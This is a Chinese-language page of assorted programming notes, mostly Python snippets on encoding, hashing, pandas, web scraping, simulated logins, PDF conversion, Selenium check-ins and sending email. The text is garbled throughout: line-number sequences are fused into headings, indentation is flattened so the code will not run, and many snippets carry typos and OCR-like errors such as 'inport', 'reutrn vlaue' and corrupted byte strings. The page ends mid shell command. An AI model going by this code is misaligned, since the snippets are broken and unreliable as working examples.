print('抱歉，账号或密码不正确，你还有', 3 - n, '次机会') $n = 0; while ($n &lt; 3) &#123; #累计次数,用于循环条件 $n = $n + 1; #定义账号和密码 $uname = 'tangqingsong'; $pwd = '123123'; #接收参数 fwrite(STDOUT, '请输入用户名：'); $username = trim(fgets(STDIN)); fwrite(STDOUT, '请输入密码：'); $password = trim(fgets(STDIN)); #判断用户输入的账号和密码是否正确，正确将提示成功，并且退出循环体 if ($uname == $username and $pwd == $password) &#123; print_r('恭喜你，登陆成功~'); break; #三次机会用完的时候,提示错误次数，并告知即将退出 &#125; elseif ($n == 3) &#123; print_r("已错误&#123;$n&#125;次，即将退出..."); &#125; else &#123; #如果在三次以内,提示还剩下几次机会 $j = 3 - $n; print_r("抱歉，账号或密码不正确，你还有&#123;$j&#125;次机会"); &#125; &#125; python2与3的编码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108Python2有两种表示字符序列的类型，分别叫做str和Unicode，str实例包含原始的8位值；而Unicode的实例，则包含Unicode字符。str格式本质含义是“某种编码格式”，绝大多数情况下，被引号框起来的字符串，就是str，这时的字符串编码类型，其实就是你Python文件的编码类型，比如在Windows里，默认用的是GBK编码。Unicode格式的含义就是“用unicode编码的字符串”。Python在进入2.0版后正式定义了了Unicode字符串这个奇怪的特性，目的就是为了处理太多种语言编码的文本。从那时开始，Python语言中的字符串类型就分为两种：一种是传统的Python字符串（各种花样编码），另一种则是新出现的UnicodePython3也有两种表示字符序列的类型：bytes和str。前者的实例包含原始的8位值，后者的实例包含Unicode字符,可以说python3的str，就是python2的Unicodestr格式的定义变更为”Unicode类型的字符串“，也就是说在默认情况下，被引号框起来的字符串，是使用Unicode编码的。而“不是Unicode的某种编码格式”，比如UTF-8、GBK，这些编码方式被定义为了bytes，这里的bytes和py2中的str有很多相似的地方我们需要编写两个辅助（helper）函数，以便在这两种情况之间转换，使得转换后的输入数据能够符合开发者的预期#在Python3中，我们需要编写接受str或bytes，并总是返回str的方法：def to_str(bytes_or_str): if isinstance(bytes_or_str, bytes): value = bytes_or_str.decode('utf-8') else: value = bytes_or_str return value # Instance of str #另外，还需要编写接受str或bytes，并总是返回bytes的方法：def to_bytes(bytes_or_str): if isinstance(bytes_or_str, str): value = bytes_or_str.encode('utf-8) else: value = bytes_or_str return value # Instance of bytes #在Python2中，需要编写接受str或unicode，并总是返回unicode的方法：#python2def to_unicode(unicode_or_str): if isinstance(unicode_or_str, str): value = unicode_or_str.decode('utf-8') else: value = unicode_or_str return value # Instance of unicode #另外，还需要编写接受str或unicode，并总是返回str的方法：#Python2def to_str(unicode_or_str): if isinstance(unicode_or_str, unicode): value = unicode_or_str.encode('utf-8') else: value = unicode_or_str reutrn vlaue # Instance of str https://xin053.github.io/2016/10/30/Python%E5%AD%A6%E4%B9%A0%E9%87%8D%E7%82%B9%E6%91%98%E8%AE%B0/ str包含一个encode方法，使用特定编码将该字符串其转换为一个bytes，这称之为编码 。bytes类包含了一个decode方法，也接受一个编码作为单个必要参数，并返回一个str， 这称之为解码。 s='n排球①’ b1=s.encode（'utf-8'） b2=s.encode（） print（b1） print（b2） b\xcf\x80\xe6\x8e\x92\xe7\x9e\x83\xe3\×8l\xae' b'\xcf\×80\xe6\x8e\x92\xe7\x9e\x83\xe3\x8l\xae' inport sys print（sys.platform） print（sys.getdefaultencoding（）） win32utf-8 可以看出我这个平台默认选择的就是utf-8编码方式。 b=b'\xe6lx8e\x92\xe7\x9e\x83' s1=b.decode（encoding='utf-8"） s2=b.decode（） s3=b.decode（encoding='latin-1'） print（s1） print（s2） print（s3） 排球 排球 e2'cf &gt;&gt;&gt; '请'.encode('unicode-escape') b'\\u8bf7' &gt;&gt;&gt; b'\u8bf7'.decode('unicode-escape') '请' s='apple' b=b'apple' print（b） print（type（b）） print（s） print（type（s）） b'apple' &lt;class'bytes'&gt; apple &lt;class'str'&gt; 再近距离的看看bytes类型字节字符串，本质上它就是一串单字节16进制数b=b'apple' https://www.zhihu.com/question/35584979 print（b[0]） print（b[1：]） print（1ist（b）） 97 b'pple' [97，112，112，188，101] s=' AABec' with open(' utf-8data','w', encoding=' utf-8") as f: ' + 'f. urite(s) with open(' utf-8data','r', encoding=' utf-8') as f: u_str=f. read() print(u_str) AABeC with open(' utf-8data",' rb') as f: byte_str=f. read() print(byte_str) print(byte_str. decode(encoding=' utf-8)) b'A\ XC3\X84B\ xC3\ xa8c' AABeC Win10 下 Python2 与 Python3 兼容问题123456789101112131415新旧2个文件，加入环境变量python2.bat@echo offrename "C:\Program Files\Python37\python.exe" python.exe.disabledrename "C:\Program Files\Python37\Scripts\pip.exe" pip.exe.disabledpython3.bat@echo offrename "C:\Program Files\Python37\python.exe.disabled" python.exerename "C:\Program Files\Python37\Scripts\pip.exe.disabled" pip.exehttps://learnku.com/articles/31141 剪刀、石头、布12345678910111213141516171819202122#剪刀、石头、布import randomguess_list = ["石头", "剪刀", "布"]win_combination = [["布", "石头"], ["石头", "剪刀"], ["剪刀", "布"]]while True: people = input('请输入：石头,剪刀,布\n').strip() computer = random.choice(guess_list) print('电脑出拳：'+computer) if people not in guess_list: print('咦~~弄啥类你！~~~') continue if computer == people: print ('平手，再玩一次！') elif [computer, people] in win_combination: print ('电脑获胜！继续吧~~~') else: print ('你获胜！') break print('---------------------------------')print('Press any key to exit');input(); #防止控制台输出秒退 md5和sha1加密123456789101112131415161718192021222324252627282930313233343536373839404142import hashlib data = 'This a md5 test!'hash_md5 = hashlib.md5(data)hash_md5.hexdigest()MD5不仅仅是上面这个例子这样用来处理字符串，还有更广泛的用途：加密网站注册用户的密码。 （但去年的各大网站密码泄漏事件确实让人蛋疼……）网站用户上传图片 / 文件后，计算出MD5值作为文件名。（MD5可以保证唯一性）key-value数据库中使用MD5值作为key。比较两个文件是否相同。（大家在下载一些资源的时候，就会发现网站提供了MD5值，就是用来检测文件是否被篡改）用MD5来检测两个文件是否相同，但想想，如果是两个很大的文件，担心内存不够用，这时怎么办？这就要使用 update 方法了。代码如下：import hashlibdef get_file_md5(f): m = hashlib.md5() while True: data = f.read(10240) if not data: break m.update(data) return m.hexdigest()with open(YOUR_FILE, 'r') as f: file_md5 = get_file_md5(f)(windows 用户 要使用 'rb'方式打开文件)大家可以用下面这段代码验证一下：import hashlibx = hashlib.md5()x.update('hello, ')x.update('python')x.hexdigest()hashlib.md5('hello, python').hexdigest()这两次的输出是一样的。SHA1 也是一样的用法。https://p0sec.net/index.php/archives/33/ concat 组合 dataframe12345678910111213141516171819import pandas as pdindia_weather = pd.DataFrame(&#123; 'city': ['mumbai', 'delhi', 'banglore'], 'temperature': [32, 34, 30], 'humidity': [80, 60, 72]&#125;)us_weather = pd.DataFrame(&#123; 'city': ['newyork', 'chicago', 'orlando'], 'temperature': [21, 24, 32], 'humidity': [68, 65, 70]&#125;)df = pd.concat([india_weather, us_weather])df = pd.concat([india_weather, us_weather], ignore_index=True)df = pd.concat([india_weather, us_weather], keys=['india', 'us'])df.loc['india']df = pd.concat([temperature_df, windspeed_df], axis=1)https://learnku.com/articles/26025 数学问题123456789数学问题：假如一个星球有 100 人，每年人数翻一倍。那么，多少年之后人数才有 100 万人&gt;&gt;&gt; p=100&gt;&gt;&gt; y=0&gt;&gt;&gt; while p&lt;1000000:... p*=2... y+=1...&gt;&gt;&gt; y14 Python语法速查1234567891011121314151617181920212223242526272829303132333435http://www.ikeguang.com/2019/03/17/python-sytnax/a = [1, 2]b = aprint(id(a) - id(b)) # 地址差为 0，表示实质是同址的0b.append(3)print(a) # 只改动了 b，但 a 也跟着变动了[1, 2, 3]a is bTrue使用切片来重新分配空间： a is a[:]False运算两数中只要有一个浮点数，结果就是浮点数；整数相除，即使能除尽，结果也是浮点数；Python 内部的机制解决了整数溢出的问题，不用担心。序列主要包括字符串（str）、列表（list）与元祖（tuple）三类。&gt;&gt;&gt; 'ab'.index('b')1&gt;&gt;&gt; 'b' in 'ab'True&gt;&gt;&gt; max([1,2,3])3s = " I love Python" # 首位是空格lst = s.split(' ')lst1 = '-'.join(lst)strip() 去掉字符串首尾两端的空格。方法 lstrip()/rstrip() 则只切除首端/尾端的空格。'I like &#123;&#125; and &#123;&#125;'.format('Python', 'you')'I like Python and you''&#123;0&#125; + &#123;2&#125; = &#123;1&#125;'.format (10, 20, 'Python ') # 按顺序引用'10 + Python = 20''&#123;0&#125; * &#123;1&#125; = &#123;0&#125;'.format (10, 'Python ') # 编号反复引用'10 * Python = 10' bing搜索123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566import requests, re, time, webbrowser, codecsprint('==========搜索引擎==========')time.sleep(0.7)headers = &#123;'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Encoding':'gzip, deflate, sdch', 'Accept-Language':'zh-CN,zh;q=0.8', 'Cache-Control':'max-age=0', 'Connection':'keep-alive', 'Cookie':'SRCHD=AF=NOFORM; SRCHUID=V=2&amp;GUID=E4CB65F3BD7F4EC7922E3642567A39EC&amp;dmnchg=1; _EDGE_V=1; MUID=24CC781F18B266D70F9C758D199C670F; MUIDB=24CC781F18B266D70F9C758D199C670F; SRCHUSR=DOB=20190707&amp;T=1562487393000; SNRHOP=I=&amp;TS=; _EDGE_S=mkt=zh-cn&amp;SID=2C85ED242A1D66051D4FE0B62B33673B; _SS=SID=2C85ED242A1D66051D4FE0B62B33673B&amp;HV=1562490664; SRCHHPGUSR=CW=1089&amp;CH=1742&amp;DPR=1&amp;UTC=480&amp;WTS=63698084193&amp;PR=3', 'DNT':'1', 'Host':'cn.bing.com', 'Upgrade-Insecure-Requests':'1', 'User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1'&#125;try: try: while True: web_ids = &#123;&#125; test = [] search = input('输入搜索的内容：') page = [11, 21, 31, 41, 51] def catch(): global webs id_times = 0 for t in page: url = 'https://cn.bing.com/search?q=' + search + '&amp;qs=n&amp;sp=-1&amp;pq&amp;sc=0-5&amp;sk=&amp;cvid=275512403280414F9363B7CDC7368CBD&amp;first=' + str(t) + '&amp;FORM=PERE' text = requests.get(url, headers=headers).text a1 = '&lt;h2&gt;(.*?)&lt;/h2&gt;' a2 = 'href="(.*?)"' a3 = '&gt;(.*?)&lt;/a&gt;' title = re.findall(a1, text) for j in title: id_times = id_times + 1 title = re.findall(a3, j) webs = re.findall(a2, j) web_ids[id_times] = webs print(id_times, title[0]) print('网址：%s' % webs[0]) print() if len(webs) &gt; 0: test.append(1) if len(test) &gt; 0: print('打开网址（如需打开多个网址，请用英文符号“,”，使用其它键默认不打开任何网址）') open_web = input('网址编号：').split(',') if 'n' not in open_web: for aweb in open_web: if aweb.isdigit(): ty = int(aweb) if ty in web_ids: web = web_ids[ty] webbrowser.open(web[0]) else: print('没有符合您的搜索结果！') print('==============================') catch() except KeyboardInterrupt: exit()except requests.exceptions.ConnectionError: print('抱歉，网络出现了一点问题！')//https://learnku.com/articles/32422 time.sleep(3) exit() requests-html123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596pip install requests-htmlfrom requests_html import HTMLSessionsession = HTMLSession()# GET请求url = "http://kaoshi.edu.sina.com.cn/college/scorelist?tab=batch&amp;wl=1&amp;local=2&amp;batch=&amp;syear=2013"r = session.get(url)r.encoding='utf-8' # 解决中文乱码问题print(r.text)# 获取的网页的内容存储到本地with open('test.html','wb') as f: f.write(r.content)# POST请求url = 'https://shuju.wdzj.com/plat-info-target.html'params = &#123;'wdzjPlatId': 59,'type': 1, 'target1': 1, 'target2': 0&#125;r = session.post(url, params=params)print(r.text)###定制请求头headers = &#123;'user-agent': 'my-app/0.0.1'&#125;r = session.get(url, headers=headers)r = session.get('http://www.w3school.com.cn')print(r.html.links)# 输出 (太多，中间省略部分)&#123;'http://www.w3ctech.com/', '/glossary/index.asp', '/html5/html5_quiz.asp', '/php/index.asp', '/asp/index.asp', '/php/php_ref_date.asp', 'http://wetest.qq.com/?from=links_w3school', '/asp/asp_ref.asp', '/tags/index.asp', '/xmldom/index.asp', '/example/csse_examples.asp', '/w.asp', '/index.html', 'http://weibo.com/w3schoolcomcn', '/ws.asp', '/b.asp', '/cssref/index.asp', '/jquerymobile/index.asp',...'/xsl/xsl_languages.asp','/example/html_examples.asp'&#125;# 获取绝对地址t = r.html.absolute_linksprint(t)&#123;'http://www.w3school.com.cn/media/index.asp','http://www.w3school.com.cn/glossary/index.asp','http://www.w3school.com.cn/php/php_ref.asp','http://www.w3school.com.cn/site/index.asp',...'http://www.w3school.com.cn/asp/asp_quiz.asp'&#125;# 获取3cschoool首页左侧的菜单列表 first=True表示找到的第一个‘HTML教程’menuList = r.html.find('#navsecond &gt; ul', first=True)print(menuList.text)# 输出HTMLHTML5XHTMLCSSCSS3TCP/IP# 找出所有菜单的标题和链接menuList = r.html.find('#navsecond &gt; ul')for menu in menuList: print(menu.text) # 获得标题 print(menu.absolute_links) # 获得链接# 输出HTMLHTML5XHTMLfrom requests_html import HTMLSessionimport requestssession = HTMLSession()# 背景图片地址url = "http://www.win4000.com/wallpaper_2285_0_10_1.html"r = session.get(url)# 新建bg文件夹if not os.path.exists('bg'): os.mkdir('bg')# 保存图片到bg/目录def save_image(url, title): img_response = requests.get(url) with open('./bg/'+title+'.jpg', 'wb') as file: file.write(img_response.content)# 查找页面中图片列表，找到链接，# 点击链接，访问查看大图，并获取大图地址pic-largeitems_img = r.html.find('ul.clearfix &gt; li &gt; a')for img in items_img: img_url = img.attrs['href'] if "/wallpaper_detail" in img_url: r = session.get(img_url) # 解析图片详情 item_img = r.html.find('img.pic-large', first=True) url = item_img.attrs['src'] # 大图图片地址 title = item_img.attrs['title'] # 图片标题 print(url+title) save_image(url, title) http://www.golang365.com/#/blog/17 输出今天日期123456import time# 获取今天年月日nowdate = time.localtime(time.time()) # 获得当前时间戳today = time.strftime('%Y-%m-%d %H:%M:%S', nowdate) # 转换成指定格式print(today) 保存json文件123456789101112131415import iosendData = [ &#123; id: 1, name: '奥特曼' &#125;,&#123; id: 2, name: '小怪兽' &#125;]with io.open('data.json', 'w', encoding="utf-8") as file: json.dump(sendData, file, ensure_ascii=False, sort_keys=True, indent=2)print('保存成功')#http://www.golang365.com/#/blog/18 openCV123456789101112131415161718pip install --upgrade setuptoolspip install numpy Matplotlibpip install opencv-python如果多次下载失败，可以从 http://www.lfd.uci.edu/~gohlke/pythonlibs/ 直接下载whl包安装，安装whl包依然使用pip#导入cv模块import cv2 as cv#读取图像，支持 bmp、jpg、png、tiff 等常用格式img = cv.imread(r"E:\python\test.jpg")#创建窗口并显示图像cv.namedWindow("Image")cv.imshow("Image",img)cv.waitKey(0)#释放窗口cv2.destroyAllWindows() http://www.golang365.com/#/blog/19 图片转pdf1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950pip install reportlabimport sysfrom reportlab.pdfgen import canvas# 生成多页pdf 生成一个3页的pdf文件def texttopdf(): c = canvas.Canvas('text.pdf') c.drawString(100, 100, "Some text in first page.") c.showPage() c.drawString(100, 100, "Some text in second page.") c.showPage() c.drawString(100, 100, "Some text in third page") c.showPage() c.save()texttopdf()print('转换成功！')# 单张图片转pdf，图片不失真。比较清晰import sysfrom reportlab.lib.pagesizes import portraitfrom reportlab.pdfgen import canvasfrom PIL import Image# 如果有输指定文件则转换参数里的图片，否则转换test.jpg文件if len(sys.argv) &gt; 1: img = sys.argv[1] filename = img.split('.')[0] f_jpg = filename+'.jpg' f_pdf = filename+'.pdf' print(f_jpg)else: img = 'wechat.png' f_pdf = 'test.pdf'def imgtopdf(): (maxw, maxh) = Image.open(img).size c = canvas.Canvas(f_pdf, pagesize=(maxw, maxh)) c.drawImage(img, 0, 0, maxw, maxh) c.showPage() c.save()imgtopdf()print('转换成功！')https://github.com/sweida/python-study/tree/master/imgToPdfhttp://www.golang365.com/#/blog/22 模拟登录1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071import requestssession = requests.session()headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36'&#125;def login(): url = 'http://119.29.27.100/apis/login' data = &#123; 'username': XXX, 'password': ******* &#125; response = session.post(url, data=data, headers=headers) responseData = response.json() if responseData['status']==1: print('登录成功') comment() else: print('登录失败', '失败原因：', responseData['msg'])def comment(): url = 'http://119.29.27.100/apis/message/add' data = &#123; 'content': '这条应该是有登录的', 'ykname': '' &#125; response = session.post(url, data=data, headers=headers) responseData = response.json() if responseData['status'] == 1: print('留言成功') else: print('留言失败', '失败原因：', responseData['msg'])login()import requestsheaders = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36'&#125;# 利用浏览器登录后得到的cookie，cookie_str = r'_myFavMv=%5B%5D; td_cookie=3034830472; laravel_session=eyJpdiI6Ik4wSjFSUU1wcFo1SndYRFliNWZZeXc9PSIsInZhbHVlIjoiMHJWZzM1WmpGRXp6NWVLYk9OaUdHOVVzcWRNK25lQ21lMFhIcmk4eUxKcEFMSnhwSDBMbTFyM3duUllqT3IycGRIc3V2TGhzWEdWaytWRkpzT3hNelE9PSIsIm1hYyI6ImNiMjRhMGFiYTIxYWJhMjUwZDJlNGI2ODgzY2ZiYzY4ZGY4NzI0MDQ4OGZkN2RiNGIwZGM2M2I2YmExYmY3OGIifQ%3D%3D'#把cookie字符串处理成字典，以便接下来使用cookies = &#123;&#125;for line in cookie_str.split(';'): key, value = line.split('=', 1) cookies[key] = valuedef comment(): url = 'http://119.29.27.100/apis/message/add' data = &#123; 'content': '再试一条cookie请求', 'ykname': '' &#125; response = requests.post(url, data=data, headers=headers, cookies=cookies) responseData = response.json() # print(responseData) if responseData['status'] == 1: print('留言成功') else: print('留言失败', '失败原因：', responseData['msg'])comment()http://www.golang365.com/#/blog/54 猫眼票房123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899import reimport timeimport datetimeimport base64import requestsfrom requests.exceptions import RequestExceptionfrom pyquery import PyQuery as pqfrom fontTools.ttLib import TTFontfont = TTFont('font1.woff')uni_list = font.getGlyphOrder()[2:]first_match = &#123; 'uniE893': '0', 'uniF690': '1', 'uniF55C': '2', 'uniF28F': '3', 'uniF4B1': '4', 'uniE623': '5', 'uniF294': '6', 'uniEEC4': '7', 'uniE577': '8', 'uniE77B': '9'&#125;def get_one_page(date): headers = &#123; 'User-Agent': os.getenv('User_Agent') &#125; url = 'https://piaofang.maoyan.com/?ver=normal&amp;date=' + date try: response = requests.get(url, headers=headers) if response.status_code == 200: return response.text else: return None except RequestException as e: print("Requests &#123;&#125;, Error &#123;&#125;.".format(date, e.args)) return Nonedef parse_font(html): fonts = re.findall(r'base64,(.*?)\)', html, re.S)[0] # fonts = re.search(r'base64,(.*?)\)', html, re.S) fonts = base64.b64decode(fonts) with open('tmp.woff', 'wb') as fp: fp.write(fonts) font1 = TTFont('tmp.woff') # obj_list1 = font1.getGlyphNames()[1:-1] uni_list1 = font1.getGlyphOrder()[2:] tmp_match = &#123;&#125; for uni1 in uni_list1: obj1 = font1['glyf'][uni1] #获取编码 uni1 在 tmp.ttf 中对应的对象 for uni in uni_list: obj = font['glyf'][uni] if obj==obj1: tmp_match[uni1] = first_match[uni] return tmp_matchdef rebuild_number(number, tmp_match): '''还需要对数字进行改写''' result = '' for num in number: s = str(hex(ord(num))) s = s.upper().replace('0X', 'uni') if s in tmp_match.keys(): result += tmp_match[s] else: result += num return resultdef parse_one_page(html): tmp_match = parse_font(html) doc = pq(html) today = doc('.today').text()[:10] movies = doc('#ticket_tbody ul').items() for movie in movies: result = &#123;&#125; result['date'] = today result['movieName'] = movie.find('.c1 b').text() result['releaseInfo'] = movie.find('.c1 em').text().split()[0] result['sumBoxInfo'] = rebuild_number(movie.find('.c1 em i').text(), tmp_match) result['boxInfo'] = rebuild_number(movie.find('.c2').text(), tmp_match) result['boxRate'] = rebuild_number(movie.find('.c3').text(), tmp_match) result['showRate'] = rebuild_number(movie.find('.c4').text(), tmp_match) result['avgSeatView'] = rebuild_number(movie.find('.c5').text(), tmp_match) yield resultdef main(): start_date = datetime.date.today() for i in range(0, 31): date = start_date - datetime.timedelta(days=i) html = get_one_page(date.isoformat()) for result in parse_one_page(html): print(result) time.sleep(1)if __name__ == '__main__': main() https://learnku.com/articles/32534#reply104205 锟斤拷12345&gt;&gt;&gt; s = (u'\uFFFD'.encode('utf8')*2)&gt;&gt;&gt; print(s.decode('gbk'))锟斤拷当unicode遇到解释失败的字时，会尝试用 「U+FFFD」 来代替，「U+FFFD」乃是 unicode 的一个占位符， 显示为 �http://cuihuan.net/2019/05/12/%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/ ###123456789101112131415161718192021222324252627pip intall nonudeimport nudeprint(nude.is_nude("godfather.jpg"))print(nude.is_nude("leisheng.jpg"))print(nude.is_nude("qiaoba.png"))import globimport itertoolsfrom nude import Nudeimages_format = ['jpg', 'png', 'gif'] # 图片格式images_jpg = glob.glob("E:/Images/OOXX/*.jpg") # 返回匹配指定模式的文件名images_png = glob.glob("E:/Images/OOXX/*.png")images_gif = glob.glob("E:/Images/OOXX/*.gif")images_list = itertools.chain(images_jpg, images_png, images_gif)for i in images_list: print(i) # 输出照片的路径 n = Nude(i) # 对图片进行识别 n.parse() print(n.result) # 输出结果 print(n.message) # 输出判断信息 print(n.inspect()) # 输出更加详细的判断信息 原文: https://lbjheiheihei.xyz/2018/05/14/Use-Python-Identifying-Porngraphic-Images.html 安装scrapy失败123456789101112131415161718192021222324252627282930依次安装lxml、pyOpenSSL、Twisted、pywin32 这些基本库都要安装好。 pip install lxml 如果不行，则去下面的网站下载。 https://pypi.org/project/lxml/#files https://www.lfd.uci.edu/~gohlke/pythonlibs/#lxml 比如我这台电脑是 Python3.6，32位的就下载 lxml-4.2.1-cp36-cp36m-win32.whl 进入 cmd，然后 cd 到文件的路径下，接着就是 pip install lxml-4.2.1-cp36-cp36m-win32.whl 命令后面那一部分要和文件名保持一致，也就是 pip install 文件名.whl回车，等一会就安装好了 pip install lxml PythonCopy 如果不行，则去下面的网站下载。 https://pypi.org/project/lxml/#files https://www.lfd.uci.edu/~gohlke/pythonlibs/#lxml 比如我这台电脑是 Python3.6，32位的就下载 lxml-4.2.1-cp36-cp36m-win32.whl 进入 cmd，然后 cd 到文件的路径下，接着就是 pip install lxml-4.2.1-cp36-cp36m-win32.whl PythonCopy 命令后面那一部分要和文件名保持一致，也就是 pip install 文件名.whl回车，等一会就安装好了 原文: https://lbjheiheihei.xyz/2018/05/27/Install-Scrapy-In-Window.html ChromeDriver1234567891011121314151617https://sites.google.com/a/chromium.org/chromedriver/downloads http://phantomjs.org/import timefrom selenium import webdriveroptions = webdriver.ChromeOptions()options.add_argument("--incognito") # 隐身模式打开driver_path = "C:\Program Files (x86)\Google\Chrome\Application\chromedriver.exe" # chromedriver.exe 的路径browser = webdriver.Chrome(executable_path=driver_path, options=options)browser.get("https://kejibear.xyz/auth/login") # 网址browser.find_element_by_css_selector(".card-inner input[name='Email']").send_keys("@qq.com") # 账号browser.find_element_by_css_selector(".card-inner input[name='Password']").send_keys("1") # 密码browser.find_element_by_css_selector(".row .col-md-10.col-md-push-1 button.waves-effect").click()print("登录成功~")time.sleep(3)browser.find_element_by_css_selector(".card-action-btn #checkin-btn button.waves-effect").click()print("签到成功~")time.sleep(5)browser.close() 生成彩色动态二维码12345678910111213141516pip install myqrfrom MyQR import myqrversion, level, qr_name = myqr.run( words='dhb cdfb64%vjk', # 不支持中文，支持 0~9,a~z, A~Z 以及常见的常用英文标点符号和空格 version=2, # 版本，从 1至 40 level='H', # 纠错等级，范围是L、M、Q、H，从左到右依次升高 picture='4e.jpg', # 文件要放在目录下 colorized=True, # True 为彩色，False 为黑白 contrast=1.0, # 对比度 brightness=1.0, # 亮度 save_name='1d6.bmp', # 命名随便都行，格式可以是 jpg,png,bmp,gif save_dir="F:\二维码" # 路径要存在)myqr 666 -p 666.png -chttps://lbjheiheihei.xyz/2018/04/26/Use-Python-Generate-Colorful-QRcode.html 爬取简书用户的动态12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364import requestsfrom lxml import etreemy_header = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"res = requests.get(url='https://www.jianshu.com/users/5aa8494a18c8/timeline', headers=&#123;'user-agent': my_header&#125;)if '大神带我来搬砖' in res.text: print('found')page = etree.HTML(res.text)last_li = page.xpath('''//ul[@class="note-list"]/li[last()]''')[0]max_id = int(last_li.get('id').split('-')[1]) - 1file = open("activity.txt",'w',encoding='utf-8')page = 2while True: res = requests.get(url='https://www.jianshu.com/users/5aa8494a18c8/timeline?max_id=%s&amp;page=%s' %(max_id,page), headers=&#123;'user-agent': my_header, 'X-INFINITESCROLL':'true'&#125;) last_li = etree.HTML(res.text).xpath('''/html/body/li[last()]''')[0] max_id = int(last_li.get('id').split('-')[1]) - 1 page = page + 1 file.write(res.text) file.write("\n") if '加入了简书' in res.text: print('end') breakfile.close()#https://www.jianshu.com/p/35a85ee14f7bfrom selenium import webdriverimport timeoptions = webdriver.ChromeOptions()prefs = &#123;"profile.managed_default_content_settings.images":2&#125;options.add_experimental_option("prefs",prefs)browser = webdriver.Chrome(chrome_options=options)browser.set_page_load_timeout(60)browser.get("https://www.jianshu.com/users/5aa8494a18c8/timeline")time.sleep(5)file = open("browser.txt",'w',encoding='utf-8')while True: text = browser.find_element_by_xpath("""//*[@id="list-container"]/ul""").text file.write(text) # remove li elements js='''var nodeList=document.querySelectorAll("#list-container &gt; ul &gt; li");for(var i=0;i&lt;nodeList.length-1;i++)&#123;nodeList[i].remove()&#125;''' browser.execute_script(js) # scroll browser.execute_script("document.documentElement.scrollTop=0") browser.execute_script("document.documentElement.scrollTop=1600") time.sleep(10) if '加入了简书' in text: print("end") breakfile.write(text)file.close() retrying 重试请求123456789101112131415161718192021222324252627pip install retryingimport requestsfrom retrying import retryheaders = &#123; "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"&#125;@retry(stop_max_attempt_number=3) # 表示重试以下代码三次def _parse_url(url): print("-" * 30) response = requests.get(url, headers=headers, timeout=3) assert response.status_code == 200 return response.content.decode()def parse_url(url): try: html_str = _parse_url(url) except: html_str = None return html_strif __name__ == "__main__": url = 'www.baidu.com' print(parse_url(url)) https://learnku.com/articles/33001 ipython123456789101112131415161718192021222324使用 Tab 实现自动补全功能。使用问号？呈现对象的说明。提供了一系列以 % 开头的魔术命令为常见任务的执行提供便利。提供了额外的绘图功能。可使用操作系统中的命令。用 %quickref 查看 IPython 的参考手册，也可以使用 %magic 来查看 IPython 中魔术命令的信息，以更好的使用 IPython 工具。最近两次执行的结果 (Out) 分别保存在 _ 及 __ 变量中。而且，IPython 还采用 _iN, _N 的方式将所有输入及输出的历史记录进行保存～其中 N 为行号In [8]: eval(_i4) # eval('1 + 7*9')Out[8]: 64 IPython 中执行过的命令，可通过 %logstart 将之保存在 Python 文件中 In [22]: !ls IPython.md data_science.md pandas.ipynb Jupyter.ipynb README.md IPython 同样提供了一些代码分析工具，如代码执行时间的分析工具 %time 和 %timeit、基本的性能分析 %prun 和 %run -p 等 %time：整体执行一次，给出执行时间； %timeit：多次执行，给出平均时间。 In [42]: %time 'foobar'.startswith('foo') CPU times: user 3 µs, sys: 0 ns, total: 3 µs Wall time: 5.96 µs Out[42]: True https://learnku.com/articles/33122#reply105653 列表中出现次数最多的数123test = [1, 2, 3, 4, 2, 2, 3, 1, 4, 4, 4, 4]print(max(set(test), key=test.count)) pygame 模块12345678import pygamefrom pygame import*pygame.init()size = (600,400) #窗口的大小screem = pygame.display.set_mode(size) #把窗口的大小放进pygame.display.set_mode()函数里进行创建。screem.fill((250,250,250))写好了，但是窗口还是黑色，那是因为窗口还没刷新，用 pygame.display.update () 来进行刷新https://learnku.com/articles/33209#reply105837 发送html格式邮件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105#!/usr/bin/python# -*- coding: utf-8 -*-import smtplib, time, osfrom email.mime.text import MIMETextfrom email.header import Headerdef send_mail_html(file): sender = 'admin@jinchuang.org' #发件人 receiver = 'gaojing@jinchuang.org' #收件人 t = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()) #获取当前时间 subject = '博客磁盘使用报警_' + t #邮件主题 smtpserver = 'smtp.exmail.qq.com' #发送服务器地址 username = 'admin@jinchuang.org' #用户名 password = 'passwd' #密码 f = open(file, 'rb') mail_body = f.read() f.close() msg = MIMEText(mail_body, _subtype='html', _charset='utf-8') msg['Subject'] = Header(subject, 'utf-8') msg['From'] = sender msg['To'] = receiver try: smtp = smtplib.SMTP() smtp.connect(smtpserver) smtp.login(username, password) smtp.sendmail(sender, receiver, msg.as_string()) except: print("邮件发送失败！") else: print("邮件发送成功！") finally: smtp.quit()file = '/tmp/df.html' #html文件send_mail_html(file)html表格模板#!/bin/baship=`ifconfig |grep -v 127 |grep inet|awk '&#123;print $2&#125;'`a=`df 